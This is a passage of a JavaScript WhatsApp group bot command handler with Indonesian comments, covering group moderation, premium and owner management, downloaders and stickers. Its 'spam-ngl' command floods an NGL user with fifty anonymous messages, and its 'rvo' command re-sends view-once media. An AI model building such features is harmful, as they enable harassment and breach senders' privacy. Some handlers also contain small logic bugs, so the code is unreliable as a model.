            await delay(1000); // Jeda 1 detik

            successCount++;
        } catch (error) {
            // Tangani jika ada chat yang gagal dikirimi pesan
            console.error(`Gagal mengirim broadcast ke ${chatId}:`, error);
            failedCount++;
        }
    }

    // Beri laporan hasil broadcast
    reply(`Broadcast selesai!\nBerhasil dikirim ke ${successCount} chat.\nGagal dikirim ke ${failedCount} chat.`);
}
break;

  
  case "kick":
  case "kik":
  case "dor":{
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
      if (!m?.isGroup) return reply(mess.group)
      if (!isAdmins) return reply(mess.admin)
      if (!isBotAdmins) return reply(mess.botadmin)
      if (!text && !m?.quoted) return reply(`𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗`)
      let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
      await conn.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
  }
  break
                
  case 'antilink': {
      if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)	
      if (!m.isGroup) return reply(mess.group)
      if (!isAdmins && !Access) return reply(mess.admin)		
      if (!isBotAdmins) return reply(mess.botadmin)
      if (!text) return reply(`silakan pilih opsinya, on/off, contoh ${prefix + command} on/off`)
      if (args[0] === "on") {
          if (global.db.data.chats[m.chat].antilink) return reply(`udaaa aktif`)
          global.db.data.chats[m.chat].antilink = true
          reply('done yak icik bosh')
      } else if (args[0] === "off") {		
          if (!global.db.data[m.chat].antilink) return reply(`udah nonaktif`)
          global.db.data[m.chat].antilink = false
          reply(mess.s)
      }
  }
  break
          
 case 'tagme': {
     if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
     if (!isGroup) return false;
     let menst = [m.sender];
     conn.sendMessage(m.chat, { 
         text: `@${m.sender.split('@')[0]}`,  
         mentions: menst        
     }
   )   
 }
 break
                
 case 'promote': {
     if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
     if (!m.isGroup) return reply(mess.group)
     if (!Access && !isAdmins) return reply(mess.admin)
     if (!isBotAdmins) return reply(mess.botadmin)
     if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return reply('𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗')
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
     if (!m.mentionedJid[0] && !m.quoted && !text) return reply(`𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗`)
     await reaction(m.chat, "⚡")
     await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(mess.s)).catch((err) => reply('terjadi kesalahan'))
 }
 break
                
 case 'demote':
 case 'dm': {
     if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
     if (!m.isGroup) return reply(mess.group)
     if (!Access && !isAdmins) return reply(mess.admin)
     if (!isBotAdmins) return reply(mess.botadmin)
     if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return m.warning('𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗')
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
     if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`𝙏𝙖𝙜 𝙊𝙧 𝙍𝙚𝙥𝙡𝙮 🎗`)
     await reaction(m.chat, "⚡")
     await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(mess.s)).catch((err) => reply('terjadi kesalahan'))
 }
 break
                
case 'addprem': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access) return reply(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} 62888|30d 🎗`)
    if (!hari) return reply("𝙄𝙣𝙥𝙪𝙩 𝙏𝙧𝙞𝙖𝙡 𝘿𝙖𝙮 🎗")
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return reply('𝙏𝙝𝙞𝙨 𝙊𝙬𝙣𝙚𝙧 🎗')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return reply('')
    let data = await conn.onWhatsApp(users)
    if (data[0].exists) {
        await reaction(m.chat, '🕑')
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = `𝙎𝙪𝙘𝙘𝙚𝙨𝙨 🎗
- User : @${users.split("@")[0]}
- Expired : ${hari.toUpperCase()}
- Countdown : ${cekvip.days} hari, ${cekvip.hours} jam, ${cekvip.minutes} menit`
        const contentText = {
            text: teks,
            contextInfo: {	
                mentionedJid: conn.ments(teks),
                externalAdReply: {
                    title: `premium user`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
                    sourceUrl: 'https://google.com'
                }	
            }	
        };	
        return conn.sendMessage(m.chat, contentText, { quoted: glxNull })
    } else {		
         reply("𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗")
    }	
}
break
                
case 'delprem': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access) return reply(mess.owner)
    if (!args[0]) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} 62888 🎗`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return reply(mess.s)
    let data = await conn.onWhatsApp(users)
    await reaction(m.chat, "⚡")
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./start/lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(premium))		
        reply(mess.s)
    } else {	
        reply("𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗")
    }
}
break
                
case 'addowner': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access) return reply(mess.owner);
    if (!args[0]) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} 62888 🎗`);
    const prem1 = text.split("|")[0].replace(/[^0-9]/g, '');
    const cek1 = await conn.onWhatsApp(`${prem1}@s.whatsapp.net`);
    if (cek1.length == 0) return reply("𝙉𝙪𝙢𝙗𝙚𝙧 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗")      
    kontributor.push(prem1);
    await reaction(m.chat, "⚡")
    fs.writeFileSync('./start/lib/database/owner.json', JSON.stringify(kontributor));
    reply(mess.s); 
    conn.sendMessage(`${prem1}@s.whatsapp.net`, { 
        text: `*Congrats, You The New 𝙊𝙬𝙣𝙚𝙧 !!!*`},{quoted: glxNull }
           );
        }
        break;

case 'delowner': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access) return reply(mess.owner);
    if (!args[0]) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} 628888 🎗`);
    const prem2 = text.split("|")[0].replace(/[^0-9]/g, '');
            const unp = kontributor.indexOf(prem2);
            if (unp !== -1) {
                kontributor.splice(unp, 1);
                await reaction(m.chat, "⚡")
                fs.writeFileSync('./start/lib/database/owner.json', JSON.stringify(kontributor));
                reply(mess.s);
            } else {
                reply(mess.s);
            }
        }
        break;
            
        case 'public': {
            if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
            if (!Access) return reply(mess.owner) 
            conn.public = true
            reply(mess.s)
        }
        break
            
        case 'self': {
            if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
            if (!Access) return reply(mess.owner) 
            conn.public = true
            reply(mess.s)
        }
        break
            
case "jadibot": {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access && !isPremium) return reply(mess.premium)
    await reaction(m.chat, '✅')
    try {
        await jadibot(conn, m, m.sender)
    } catch (error) {
        await reply(util.format(error), command)
    }
}
break
                
case "stopjadibot": {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access && !isPremium) return reply(mess.premium)
    await reaction(m.chat, '✅')
    if (m.key.fromMe) return
    try {
        await stopjadibot(conn, m, m.sender)
    } catch (error) {
        await reply(util.format(error), command)
    }
}
break
			
case "listjadibot": {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!Access && !isPremium) return reply(mess.premium)
    if (m.key.fromMe) return
    try {
        listjadibot(conn, m)
    } catch (error) {
        await reply(util.format(error), command)
    }
}
break
                
case 'tourl': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    let q = m.quoted ? m.quoted : m
    let media = await quoted.download();
    await reaction(m.chat, "⚡")
    let uploadImage = require('./lib/uploadImage');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    const uploadFile = require('./lib/uploadFile')
    let link = await (isTele ? uploadImage : uploadFile)(media);  
    conn.sendMessage(m.chat, {
        text : `🍿 *Link Catbox* :\n ${link}`
    },{quoted: glxNull })
}
break;       
            
case 'ping': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    const old = performance.now()
    const ram = (os.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const free_ram = (os.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB";
    const serverInfo = `server information

> CPU : *${os.cpus().length} Core, ${os.cpus()[0].model}*
> Uptime : *${Math.floor(os.uptime() / 86400)} days*
> Ram : *${free_ram}/${ram}*
> Speed : *${(performance.now() - old).toFixed(5)} ms*`;
    conn.sendMessage(m.chat, {
        text: serverInfo
    },{ quoted: glxNull })
}
break;
        
case 'speedtest': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`);

    await reaction(m.chat, "⚡");
    // Beri tahu pengguna bahwa tes sedang berjalan
    reply("Memulai tes kecepatan internet di thread terpisah. Mohon tunggu...");

    // Buat worker thread baru
    const worker = new Worker('./speed_worker.js');

    // Kirim pesan ke worker untuk memulai tes
    worker.postMessage({ command: 'runSpeedtest' });

    // Handler saat worker mengirim pesan kembali ke thread utama
    worker.on('message', (msg) => {
        if (msg.status === 'completed') {
            // Worker selesai, proses hasil
            try {
                const result = JSON.parse(msg.stdout);

                // Log stderr dari worker untuk debugging di konsol bot
                if (msg.stderr && msg.stderr.trim()) {
                    console.error("Speedtest Worker stderr:", msg.stderr);
                }

                // Jika tidak ada error dalam hasil JSON, format dan kirim
                if (result && !result.error) {
                    const ping = result.ping ? `${result.ping.toFixed(2)} ms` : 'N/A';
                    const download = result.download ? `${(result.download / 10**6).toFixed(2)} Mbps` : 'N/A';
                    const upload = result.upload ? `${(result.upload / 10**6).toFixed(2)} Mbps` : 'N/A';
                    const server = result.server ? `${result.server.sponsor} (${result.server.name}, ${result.server.country})` : 'N/A';
                    const clientIp = result.client && result.client.ip ? result.client.ip : 'N/A';
                    const isp = result.client && result.client.isp ? result.client.isp : 'N/A';

                    const formattedResult = `*Hasil Speedtest:*\n`
                                          + `Ping: ${ping}\n`
                                          + `Download: ${download}\n`
                                          + `Upload: ${upload}\n`
                                          + `Server: ${server}\n`
                                          + `Client IP: ${clientIp}\n`
                                          + `ISP: ${isp}`;

                    // Kirim hasil yang diformat sebagai pesan
                    conn.sendMessage(m.chat, {
                        text: formattedResult,
                        contextInfo: {
                            externalAdReply: {
                                title: "*S P E E D  T E S T*",
                                mediaType: 1,
                                previewType: 0,
                                renderLargerThumbnail: true,
                                thumbnailUrl: JoshhhConst, // Pastikan cinahitam terdefinisi
                                sourceUrl: `https://google.com`
                            }
                        },
                        mentions: [m.sender] // Mention pengirim pesan
                    }, { quoted: glxNull }); // Pastikan glxNull terdefinisi

                } else if (result && result.error) {
                    // Jika script Python mengembalikan error dalam JSON
                    reply(`Speedtest gagal: ${result.error}`);
                } else {
                    // Kasus jika output tidak JSON atau format tidak terduga
                    reply("Gagal memproses hasil speedtest. Output tidak valid.");
                }
            } catch (parseError) {
                 console.error("Error parsing JSON from worker stdout:", parseError);
                 reply(`Gagal memproses hasil speedtest: ${parseError.message}`);
            } finally {
                // Hentikan worker setelah selesai memproses
                worker.terminate();
            }

        } else if (msg.status === 'error') {
            // Worker melaporkan error saat eksekusi
            console.error("Speedtest Worker error:", msg.error);
            let errorMessage = `Terjadi kesalahan saat menjalankan tes kecepatan di thread terpisah: ${msg.error}`;
            if (msg.stdout) errorMessage += `\nstdout: ${msg.stdout.substring(0, 100)}...`;
            if (msg.stderr) errorMessage += `\nstderr: ${msg.stderr.substring(0, 100)}...`;

            reply(errorMessage);
             // Hentikan worker setelah melaporkan error
            worker.terminate();
        }
        // Ignore 'ready' status from worker if needed
    });

    // Handler jika worker mengalami error yang tidak tertangkap di dalamnya
    worker.on('error', (err) => {
        console.error('Worker thread error:', err);
        reply(`Terjadi kesalahan fatal pada thread speedtest: ${err.message}`);
         // Hentikan worker jika error fatal
        worker.terminate();
    });

    // Handler saat worker thread keluar
    worker.on('exit', (code) => {
        if (code !== 0) {
            console.error(`Worker thread speedtest berhenti dengan kode keluar ${code}`);
            // Pesan error sudah dikirim di handler 'error' atau 'message' status 'error',
            // jadi mungkin tidak perlu reply lagi di sini kecuali untuk error tak terduga.
            // reply(`Thread speedtest berhenti secara tidak normal (kode: ${code}).`);
        } else {
             console.log('Worker thread speedtest berhasil berhenti.');
        }
    });

    // Jika worker tidak merespon dalam waktu tertentu, Anda bisa menambahkan timeout
    // Contoh sederhana (tidak termasuk dalam kode di atas):
    // setTimeout(() => {
    //     if (worker && !worker.terminated) {
    //         worker.terminate();
    //         reply("Tes kecepatan memakan waktu terlalu lama dan dibatalkan.");
    //     }
    // }, 120000); // Batalkan setelah 2 menit

}
break;

// Tambahkan case ini di dalam switch (command) block Anda
case 'sendcv':
case 'cvsend': {
    // Periksa apakah pengguna dilarang (sesuai logika isBan Anda)
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`);

    // Beri indikasi bot sedang memproses
    await reaction(m.chat, "⚡");
    // Pesan awal, beri tahu pengguna bot sedang bekerja
    reply("Mencari file di folder data...");

    const dataFolderPath = path.join(__dirname, 'data');
    let filesInFolder = [];

    console.log(`[DEBUG] Mencoba membaca folder: ${dataFolderPath}`); // Debugging: Log folder path

    try {
        // Periksa apakah folder data ada
        if (!fs.existsSync(dataFolderPath)) {
             console.error(`[DEBUG] Folder tidak ditemukan: ${dataFolderPath}`); // Debugging: Log folder not found
             return reply(`Error: Folder data (${dataFolderPath}) tidak ditemukan. Mohon buat folder 'data' di direktori bot Anda.`);
        }

        // Baca isi folder data
        const items = fs.readdirSync(dataFolderPath);
        console.log(`[DEBUG] Item ditemukan di folder data: ${items.length}`); // Debugging: Log number of items found
        console.log(`[DEBUG] Daftar item mentah:`, items); // Debugging: Log raw item list

        // Filter hanya file (bukan folder)
        filesInFolder = items.filter(item => {
            const itemPath = path.join(dataFolderPath, item);
            const isFile = fs.statSync(itemPath).isFile();
            // console.log(`[DEBUG] Memeriksa item: ${item}, Apakah File: ${isFile}`); // Debugging: Log item check
            return isFile;
        });

        console.log(`[DEBUG] File ditemukan setelah filter: ${filesInFolder.length}`); // Debugging: Log number of files found
        console.log(`[DEBUG] Daftar file:`, filesInFolder); // Debugging: Log file list

        if (filesInFolder.length === 0) {
            console.log(`[DEBUG] Tidak ada file ditemukan, mengirim pesan 'tidak ditemukan'.`); // Debugging: Log no files found
            return reply("Tidak ada file ditemukan di folder data.");
        }

        // Tambahkan jeda singkat sebelum mengirim pesan daftar/tombol
        await delay(500); // Jeda 500ms (setengah detik)


        // --- Logika Baru: Gunakan Tombol jika jumlah file sedikit, List jika banyak ---
        const maxButtons = 3; // Jumlah maksimum tombol yang akan ditampilkan dalam satu pesan

        if (filesInFolder.length <= maxButtons) {
            // Jika jumlah file sedikit, kirim pesan dengan tombol
            console.log(`[DEBUG] Jumlah file (${filesInFolder.length}) <= ${maxButtons}, membuat pesan tombol.`); // Debugging: Use buttons

            const buttons = filesInFolder.map(file => ({
                buttonId: `sendfile_${file}`, // ID tombol yang akan diproses saat diklik (gunakan prefix baru)
                buttonText: { displayText: `Unduh ${file}` }, // Teks pada tombol
                type: 1 // Reply button
            }));

            const buttonMessage = {
                text: `Ditemukan ${filesInFolder.length} file. Pilih salah satu untuk diunduh:`,
                footer: "© Joshhh",
                buttons: buttons,
                // --- Menggunakan struktur header dan viewOnce seperti case menu yang berhasil ---
                image: { url: 'https://webtechsolution.my.id/assets/images/logo-wa.png' }, // <-- Tambahkan gambar header
                headerType: 4, // <-- Gunakan headerType 4
                viewOnce: true // <-- Gunakan viewOnce true
                // -------------------------------------------------------------------------
            };

            console.log(`[DEBUG] Objek Button Message lengkap:`, buttonMessage); // Debugging: Log complete button message object

            console.log(`[DEBUG] Mencoba mengirim Button Message...`); // Debugging: Log sending attempt
            await conn.sendMessage(m.chat, buttonMessage, { quoted: m })
                .then(() => {
                    console.log(`[DEBUG] Button Message berhasil dikirim (promise resolved).`); // Debugging: Log success
                })
                .catch(sendError => {
                    console.error(`[DEBUG] Gagal mengirim Button Message (promise rejected):`, sendError); // Debugging: Log send error
                    // Fallback ke List Message jika pengiriman Button Message gagal
                    console.log(`[DEBUG] Pengiriman Button Message gagal, mencoba fallback ke List Message.`);
                    sendFileListMessage(m.chat, filesInFolder, m); // Panggil fungsi untuk mengirim List Message
                });

        } else {
            // Jika jumlah file banyak, kirim List Message
            console.log(`[DEBUG] Jumlah file (${filesInFolder.length}) > ${maxButtons}, membuat List Message.`); // Debugging: Use list

            sendFileListMessage(m.chat, filesInFolder, m); // Panggil fungsi untuk mengirim List Message
        }

        console.log(`[DEBUG] Perintah sendcv/cvsend selesai dieksekusi.`);

    } catch (error) {
        console.error("Error reading data folder or creating message:", error); // Debugging: Log the error
        return reply(`Terjadi kesalahan saat memproses file: ${error.message}`);
    }
}
break;

// --- Fungsi Helper untuk Mengirim List Message (dipanggil jika jumlah file banyak) ---
async function sendFileListMessage(chatId, filesList, originalMessage) {
    // --- Struktur List Message Sederhana untuk Tes ---
    const sections = [{
        title: "Opsi:",
        rows: [
            { title: "Opsi 1", rowId: "test_option_1" },
            { title: "Opsi 2", rowId: "test_option_2" }
        ]
    }];

    const listMessage = {
        text: `Ini adalah tes List Message sederhana.`,
        footer: "© Joshhh",
        title: "Tes Daftar",
        buttonText: "Lihat Opsi",
        sections
    };
    // --- Akhir Struktur Sederhana ---


    console.log(`[DEBUG] Objek List Message lengkap (dari helper):`, listMessage); // Debugging: Log complete list message object

    console.log(`[DEBUG] Mencoba mengirim List Message (dari helper)...`); // Debugging: Log sending attempt
    await conn.sendMessage(chatId, listMessage, { quoted: originalMessage })
        .then(() => {
            console.log(`[DEBUG] List Message berhasil dikirim (promise resolved).`); // Debugging: Log success
        })
        .catch(sendError => {
            console.error(`[DEBUG] Gagal mengirim List Message (promise rejected):`, sendError); // Debugging: Log send error
            // Opsional: Beri tahu pengguna jika pengiriman List Message gagal
            // conn.sendMessage(chatId, { text: `Maaf, gagal menampilkan daftar file. Error: ${sendError.message}` }, { quoted: originalMessage });
        });
}




case 'disk': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    exec('cd && du -h --max-depth=1', (err, stdout) => {
        if (err) return reply(`${err}`);
        if (stdout) return reply(stdout);
    });
}
break;
            
case 'sticker':
case 's':
case 'stiker': {
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!quoted) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} 🎗`);
    try {
        if (/image/.test(mime)) {
            const media = await quoted.download();
            await reaction(m.chat, "⚡")
            const imageUrl = `data:${mime};base64,${media.toString('base64')}`;
            await makeStickerFromUrl(imageUrl, conn, m);
        } else if (/video/.test(mime)) {
            if ((quoted?.msg || quoted)?.seconds > 10) return reply('durasi video maksimal 10 detik!')
                const media = await quoted.download();
                const videoUrl = `data:${mime};base64,${media.toString('base64')}`;
                await makeStickerFromUrl(videoUrl, conn, m);
            } else {
                return reply('kirim gambar/video dengan caption .s (video durasi 1-10 detik)');
            }
        } catch (error) {
            console.error(error);
            return reply('terjadi kesalahan saat memproses media. Coba lagi.');
        }
    }
    break;
            
      case 'get':{
    if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!/^https?:\/\//.test(text)) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} https://raldzz.site 🎗`);
        const ajg = await fetch(text);
          await reaction(m.chat, "⚡")
        if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
            throw `Content-Length: ${ajg.headers.get("content-length")}`;
        }

        const contentType = ajg.headers.get("content-type");
        if (contentType.startsWith("image/")) {
            return conn.sendMessage(
                m.chat,
                { image: { url: text } },
                { quoted: glxNull }
            );
        }
        if (contentType.startsWith("video/")) {
            return conn.sendMessage(
                m.chat,
                { video: { url: text } },
                { quoted: glxNull  }
            );
        }
        if (contentType.startsWith("audio/")) {
            return conn.sendMessage(
                m.chat,
                { audio: { url: text },
                mimetype: 'audio/mpeg', 
                ptt: true
                },
                { quoted: glxNull }
            );
        }
        
        let alak = await ajg.buffer();
        try {
            alak = util.format(JSON.parse(alak + ""));
        } catch (e) {
            alak = alak + "";
        } finally {
            return reply(alak.slice(0, 65536));
        }
      }
      break
        
      case 'open':
      case 'buka': {
          if (!m.isGroup) return reply(mess.group)
          if (!isAdmins && !Access) return reply(mess.admin)
          if (!isBotAdmins) return m.tolak(mess.botadmin)
          conn.groupSettingUpdate(m.chat, 'not_announcement')
          reply(mess.s)
      }
      break
                
      case 'close':
      case 'tutup': {
          if (!m.isGroup) return reply(mess.group)
          if (!isAdmins && !Access) return reply(mess.admin)
          if (!isBotAdmins) return m.tolak(mess.botadmin)
          conn.groupSettingUpdate(m.chat, 'announcement')
          reply(mess.s)
      }
      break
            
      case 'totag':{
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!isAdmins) return reply(mess.admin);
        if (!m.isGroup) return reply(mess.group);
        if (!m.quoted) return reply(`𝙍𝙚𝙥𝙡𝙮 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨 🎗`);
        const groupMetadata = await conn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        conn.sendMessage(m.chat, {
            forward: m.quoted.fakeObj,
            mentions: participants.map((a) => a.id)
           }, { quoted: glxNull });
         }
        break
            
                
      case'ai':
      case'gemini':
      case'openai':
      case'chatgpt':{
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} bla bla bla`)
          let cuki = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=kamu%20adalah%20ai%20yang%20tolol%20dan%20lucu%20buatan%20Joshhh&content=${text}`)
          await reaction(m.chat, "⚡")
          let mamad = cuki.data
          conn.sendMessage(m.chat, { text : mamad }, {quoted: glxNull })
      }
      break
            
      case'tiktok':
      case'ttdl':{
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : ${prefix + command} https://tiktok.com// 🎗`);
         let res = await await fetchJson(`https://api.hyuunewbie.my.id/api/ttdl?url=${text}`);
          await reaction(m.chat, "⚡")
         if (res && res.data) {
            let images = res.data.images || [];
            let play = res.data.play;
            let lagu = res.data.music_info.play;

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await conn.sendMessage(m.chat, {
                    video: { url: play },
                    caption: mess.s
                },{quoted: glxNull });
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `𝙀𝙨𝙩𝙞𝙢𝙖𝙩𝙞𝙤𝙣 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 ${estimatedTime} 𝙎𝙚𝙘𝙤𝙣𝙙 🎗`;
                await conn.sendMessage(m.chat, { text: message },{quoted: glxNull });

                const sendImageWithDelay = async (url, index) => {
                    let caption = `𝙄𝙢𝙖𝙜𝙚 𝙏𝙤 ${index + 1} 🎗`;
                    await conn.sendMessage(m.chat, { image: { url }, caption: caption },{quoted: glxNull });
                };
                await conn.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted: glxNull })

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗');
                await conn.sendMessage(m.chat, {
                    text: "𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗"
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await conn.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted: glxNull });
        }
      }
      break
            
      case 'pindl':{
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : .pindl https://pin.it/1DyLc8cGU 🎗`);
        let res = await fetchJson(`https://api.siputzx.my.id/api/d/pinterest?url=${text}`);
          await reaction(m.chat, "⚡")
        let mek = res.data;

        if (mek && mek.url) {
            const mediaUrl = mek.url;
            const isImage = mediaUrl.match(/\.(jpeg|jpg|png|gif)$/i);
            const isVideo = mediaUrl.match(/\.(mp4|webm|ogg)$/i);

            if (isImage) {
                await conn.sendMessage(m.chat, {
                    image: { url: mediaUrl },
                    caption: mess.s
                }, { quoted: glxNull });
            } else if (isVideo) {
                await conn.sendMessage(m.chat, {
                    video: { url: mediaUrl },
                    caption: mess.s
                }, { quoted: glxNull });
            } else {
                await conn.sendMessage(m.chat, {
                    text: "𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗"
                }, { quoted: glxNull });
            }
        } else {
            await conn.sendMessage(m.chat, {
                text: "𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗"
            }, { quoted: glxNull });
        }
      }
      break          

      case 'spam-ngl':{
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : .spam-ngl username heked bai gweh 🎗`)
        let peler = text.split("|")[0]
        let laso = text.split("|")[1]
        for (let j = 0; j < 50; j++) {
        await spamngl(peler, laso)
        }
          await reaction(m.chat, "⚡")
        conn.sendMessage(m.chat, {
            text: mess.s
          },{quoted: glxNull })
      }
      break
            
        case 'brat':{
            if (!isPremium && users.limit < 0) return reply(mess.limited); 
            users.limit -= 1;
            if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
            if (!text) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : .brat woi hytam 🎗`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${text}`;
            await reaction(m.chat, "⚡")
            await makeStickerFromUrl(imageUrl, conn, m);
        }
       break
                
      case 'delete':
      case 'd':
      case 'del': {
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
	    if (!m.quoted) return reply('𝙍𝙚𝙥𝙡𝙮 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨 🎗')
          await conn.sendMessage(m.chat, {
              delete: {
                  remoteJid: m.chat,
                  id: m.quoted.id,
                  participant: m.quoted.sender
              }
          })
      }
	  break
                
      case 'q':
      case 'quoted': {
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
          if (!m.quoted) return reply('𝙍𝙚𝙥𝙡𝙮 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨 🎗')
          let gwm = await conn.serializeM(await m.getQuotedObj())
          if (!gwm.quoted) return reply('𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗')
          await gwm.quoted.copyNForward(m.chat, true)
      }
      break

      case 'tovn': {
        if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
        if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`𝙍𝙚𝙥𝙡𝙮 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨 🎗`);
        if (!quoted) return reply(`𝙍𝙚𝙥𝙡𝙮 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨 🎗`);
        await reaction(m.chat, "⚡")
        await sleep(5000);
        let media = await quoted.download();
        let { toAudio } = require('./lib/converter');
        let audio = await toAudio(media, 'mp4');
        conn.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: glxNull });
      }
        break;
                
case "rvo": {
if (!m.quoted) return reply(`𝙀𝙭𝙖𝙢𝙥𝙡𝙚 : Reply ViewOnce with caption ${prefix + command} 🎗`);
try {
let buffer = await m.quoted.download();
let type = m.quoted.mtype;
let sendOptions = { quoted: m };
if (type === "videoMessage") {
await conn.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "imageMessage") {
await conn.sendMessage(m.chat, { image: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "audioMessage") {
await conn.sendMessage(m.chat, { 
audio: buffer, 
